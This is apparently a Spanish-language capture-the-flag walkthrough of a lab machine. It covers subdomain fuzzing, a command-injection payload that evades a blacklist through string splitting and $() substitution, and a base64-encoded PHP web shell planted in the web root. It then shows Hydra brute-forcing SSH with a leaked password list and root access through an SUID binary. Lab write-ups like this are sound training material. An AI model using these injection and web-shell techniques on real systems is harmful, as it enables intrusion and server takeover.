## Reconocimiento:

Puerto 22 : SSH

Puerto 80 : HTTP 

En el escaneo encuentro un dominio:

```bash
http://internal.dl
```

Le hago fuzzing de subdominios:

```bash
ffuf -c -t 200 -w <WORDLIST> -H "Host: FUZZ.internal.dl" -u http://internal.dl/
```

Encuentro “backup”:

```bash
http://backup.internal.dl
```

Dentro hay una shell que ejecuta comandos. Intento concatenar comandos y detecto que hay un blacklist que bloquea caracteres después del comando.

Tras varias pruebas, se detecta que el filtrado no contempla correctamente la **sustitución de comandos** (`$()`), ni técnicas de evasión mediante fragmentación de cadenas.

Sabiendo que la ruta en la que estamos y que después de muchos intentos de mandarme una shell fallidos, hago lo siguiente:

```bash
$(p''rintf${IFS}"PD9waHAgc3lzdGVtKCRfR0VUWyd4J10pOyA/Pg=="|b''as e64${IFS}-d>/var/www/html/cmd.php)
```

Desde la URL:

```bash
http://internal.dl/cmd.php?x=<COMANDO>
```

En el directorio /opt hay un archivo interesante:

```bash
view-source:http://internal.dl/cmd.php?x=cat%20/opt/.vault_pass.txt
```

Es una lista de posibles contraseñas, la paso a un archivo y uso Hydra sabiendo que el usuario vault existe:

```bash
hydra -l vault -P pass ssh://172.17.0.2 -t 64
```

Pass : Yk8$pZ5@cN4!

## Escalada:

Listo permisos SUID:

```bash
find / -perm -4000 2>/dev/null
```

Encuentro uno interesante:

```bash
/usr/local/bin/vaultctl
```

Que al ser ejecutado nos da una shell como root.

Listo.
